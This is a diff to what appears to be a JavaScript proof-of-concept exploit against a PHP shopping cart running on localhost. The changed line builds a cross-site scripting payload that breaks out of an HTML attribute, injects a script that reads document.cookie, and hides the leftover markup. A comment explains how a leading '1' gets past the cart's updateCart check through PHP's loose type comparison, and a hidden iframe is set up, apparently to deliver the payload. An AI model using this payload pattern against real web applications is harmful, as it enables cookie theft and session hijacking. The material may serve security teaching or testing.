@@ -7,12 +7,12 @@
             The one prepending the script is necessary to pass the check in updateCart
             since in PHP you can compare strings with ints.
         */
-        let dangerousJS = "1\" /><scri"+"pt>alert(document.cookie);</scr"+"ipt>\"";
+        let dangerousJS = "1\" /><scri"+"pt>alert(document.cookie);</scr"+"ipt><img style=\"display: none;";
 
         // What's prefixing e.g. index.php in the URL.
         let baseURL = "http://localhost:8080/";
 
-        
+
         let iframe = document.createElement("iframe");
         iframe.name = "myTarget";
         iframe.style.display = "none";
